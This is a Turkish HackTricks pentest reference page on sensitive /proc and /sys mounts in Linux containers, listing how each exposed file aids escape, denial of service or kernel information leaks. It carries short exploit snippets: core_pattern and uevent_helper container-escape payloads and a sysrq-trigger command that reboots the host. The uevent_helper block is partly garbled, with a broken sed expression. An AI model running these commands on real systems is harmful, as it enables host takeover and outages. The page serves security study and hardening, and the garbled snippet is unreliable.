# Hassas Bağlantı Noktaları

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman olmaya öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünleri**](https://peass.creator-spring.com)'ni edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)'da **takip edin**.
* **Hacking püf noktalarınızı göndererek HackTricks ve HackTricks Cloud** github depolarına PR göndererek paylaşın.

</details>

<figure><img src="../../../..https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

Doğru namespace izolasyonu olmadan `/proc` ve `/sys`'in maruz kalması, saldırı yüzeyinin genişlemesi ve bilgi sızdırma gibi ciddi güvenlik risklerini beraberinde getirir. Bu dizinler, yanlış yapılandırılmış veya yetkisiz bir kullanıcı tarafından erişilen hassas dosyaları içerir ve bu da konteyner kaçışına, ana bilgisayarın değiştirilmesine veya daha fazla saldırıya yardımcı olacak bilgilerin sağlanmasına neden olabilir. Örneğin, `-v /proc:/host/proc` şeklinde yanlış bağlama yapılması, yol tabanlı doğası nedeniyle AppArmor korumasını atlayabilir ve `/host/proc`'u korumasız bırakabilir.

**Her potansiyel zafiyetin daha fazla ayrıntısını** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)** adresinde bulabilirsiniz.**

## procfs Zafiyetleri

### `/proc/sys`

Bu dizin, genellikle `sysctl(2)` aracılığıyla çekirdek değişkenlerini değiştirme izni verir ve endişe kaynağı olan birkaç alt dizini içerir:

#### **`/proc/sys/kernel/core_pattern`**

* [core(5)](https://man7.org/linux/man-pages/man5/core.5.html) adresinde açıklanmıştır.
* İlk 128 baytı argümanlar olarak alan bir programın çekirdek dosyası oluşturulduğunda yürütülmesine izin verir. Bu, dosyanın bir boru `|` ile başlaması durumunda kod yürütmeyle sonuçlanabilir.
*   **Test ve Sömürü Örneği**:

```bash
[ -w /proc/sys/kernel/core_pattern ] && echo Yes # Yazma erişimini test et
cd /proc/sys/kernel
echo "|$overlay/shell.sh" > core_pattern # Özel işleyiciyi ayarla
sleep 5 && ./crash & # İşleyiciyi tetikle
```

#### **`/proc/sys/kernel/modprobe`**

* [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html) adresinde detaylı olarak açıklanmıştır.
* Çekirdek modül yükleyicisinin yolunu içerir, çekirdek modüllerini yüklemek için çağrılır.
*   **Erişimi Kontrol Etme Örneği**:

```bash
ls -l $(cat /proc/sys/kernel/modprobe) # modprobe'a erişimi kontrol et
```

#### **`/proc/sys/vm/panic_on_oom`**

* [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html) adresinde referans gösterilmiştir.
* Bir OOM durumu meydana geldiğinde çekirdeğin çökmesini veya OOM öldürücüyü çağırmasını kontrol eden genel bir bayrak.

#### **`/proc/sys/fs`**

* [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html) adresinde belirtildiği gibi, dosya sistemi hakkında seçenekler ve bilgiler içerir.
* Yazma erişimi, ana bilgisayara karşı çeşitli hizmet reddi saldırılarına olanak tanır.

#### **`/proc/sys/fs/binfmt_misc`**

* Sihirli sayılarına dayalı olmayan ikili biçimler için yorumlayıcıları kaydetmeye olanak tanır.
* `/proc/sys/fs/binfmt_misc/register` yazılabilirse ayrıcalık yükseltmesine veya kök kabuk erişimine yol açabilir.
* İlgili sömürü ve açıklama:
* [binfmt\_misc ile yoksul adamın kök kiti](https://github.com/toffan/binfmt\_misc)
* Detaylı öğretici: [Video bağlantısı](https://www.youtube.com/watch?v=WBC7hhgMvQQ)

### Diğerleri `/proc` içinde

#### **`/proc/config.gz`**

* `CONFIG_IKCONFIG_PROC` etkinse çekirdek yapılandırmasını ortaya çıkarabilir.
* Çalışan çekirdekteki zafiyetleri belirlemek için saldırganlar için faydalıdır.

#### **`/proc/sysrq-trigger`**

* Sysrq komutlarını çağırmaya izin verir, potansiyel olarak anında sistem yeniden başlatmalar veya diğer kritik işlemlere neden olabilir.
*   **Ana Bilgisayarı Yeniden Başlatma Örneği**:

```bash
echo b > /proc/sysrq-trigger # Ana bilgisayarı yeniden başlatır
```

#### **`/proc/kmsg`**

* Çekirdek halka tamponu mesajlarını açığa çıkarır.
* Çekirdek saldırılarına yardımcı olabilir, adres sızıntılarına ve hassas sistem bilgilerine sağlayabilir.

#### **`/proc/kallsyms`**

* Çekirdek dışa aktarılan sembolleri ve adreslerini listeler.
* Özellikle KASLR'yi aşmak için çekirdek sömürü geliştirme için temel öneme sahiptir.
* Adres bilgileri `kptr_restrict`'in `1` veya `2` olarak ayarlanmasıyla sınırlıdır.
* Detaylar [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html) adresinde bulunabilir.

#### **`/proc/[pid]/mem`**

* Çekirdek bellek cihazı `/dev/mem` ile etkileşim sağlar.
* Tarihsel olarak ayrıcalık yükseltme saldırılarına karşı savunmasızdır.
* Daha fazlası [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html) adresinde bulunabilir.

#### **`/proc/kcore`**

* Sistemin fiziksel belleğini ELF çekirdek biçiminde temsil eder.
* Okuma, ana bilgisayar sistemi ve diğer konteynerlerin bellek içeriğini sızdırabilir.
* Büyük dosya boyutu okuma sorunlarına veya yazılım çökmelerine yol açabilir.
* Ayrıntılı kullanım [2019'da /proc/kcore Dökme](https://schlafwandler.github.io/posts/dumping-/proc/kcore/) adresinde bulunabilir.

#### **`/proc/kmem`**

* Çekirdek sanal belleği temsil eden `/dev/kmem` için alternatif arayüz.
* Okuma ve yazma izin verir, dolayısıyla çekirdek belleğinin doğrudan değiştirilmesine olanak tanır.

#### **`/proc/mem`**

* Fiziksel belleği temsil eden `/dev/mem` için alternatif arayüz.
* Okuma ve yazma izin verir, tüm belleğin değiştirilmesi sanal adreslerin fiziksel adreslere çözülmesini gerektirir.

#### **`/proc/sched_debug`**

* PID ad alanı korumalarını atlayarak işlem zamanlama bilgilerini döndürür.
* İşlem adlarını, kimlikleri ve cgroup tanımlayıcılarını açığa çıkarır.

#### **`/proc/[pid]/mountinfo`**

* İşlem montaj ad alanındaki bağlantı noktaları hakkında bilgi sağlar.
* Konteyner `rootfs` veya görüntünün konumunu açığa çıkarır.

### `/sys` Zafiyetleri

#### **`/sys/kernel/uevent_helper`**

* Çekirdek cihaz `uevent`'leri işlemek için kullanılır.
* `/sys/kernel/uevent_helper`'a yazmak, `uevent` tetikleyicileri üzerine keyfi komut dosyalarını yürütmesine olanak tanır.
*   **Sömürü için Örnek**: %%%bash

### Bir yük oluşturur

echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper

### Konteyner için OverlayFS bağlama noktasından ana bilgisayar yolunu bulur

host\_path=$(sed -n 's/._\perdir=(\[^,]_).\*/\1/p' /etc/mtab)

### uevent\_helper'ı kötü amaçlı yardımcıya ayarlar

echo "$host\_path/evil-helper" > /sys/kernel/uevent\_helper

### Bir uevent tetikler

echo change > /sys/class/mem/null/uevent

### Çıktıyı okur

cat /output %%%
#### **`/sys/class/thermal`**

* Sıcaklık ayarlarını kontrol eder, olası DoS saldırılarına veya fiziksel hasara neden olabilir.

#### **`/sys/kernel/vmcoreinfo`**

* Kernel adreslerini sızdırır, KASLR'ı tehlikeye atabilir.

#### **`/sys/kernel/security`**

* `securityfs` arayüzünü barındırır, AppArmor gibi Linux Güvenlik Modülleri'nin yapılandırılmasına izin verir.
* Erişim, bir konteynerin MAC sistemini devre dışı bırakmasına olanak tanıyabilir.

#### **`/sys/firmware/efi/vars` ve `/sys/firmware/efi/efivars`**

* NVRAM'daki EFI değişkenleriyle etkileşim için arayüzler sunar.
* Yanlış yapılandırma veya istismar, tuğla haline gelen dizüstü bilgisayarlar veya başlatılamayan ana bilgisayar makinelerine yol açabilir.

#### **`/sys/kernel/debug`**

* `debugfs`, çekirdeğe "kurallar olmadan" hata ayıklama arayüzü sunar.
* Sınırsız doğası nedeniyle güvenlik sorunları geçmişi bulunmaktadır.

### Referanslar

* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
* [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc\_group\_understanding\_hardening\_linux\_containers-1-1.pdf)
* [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container\_whitepaper.pdf)

<figure><img src="../../../..https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu
* **💬 [Discord grubuna](https://discord.gg/hRep4RUj7f) veya [telegram grubuna](https://t.me/peass) katılın veya** bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)'da takip edin**.
* **Hacking püf noktalarınızı paylaşarak HackTricks ve HackTricks Cloud** github depolarına PR göndererek katkıda bulunun.

</details>
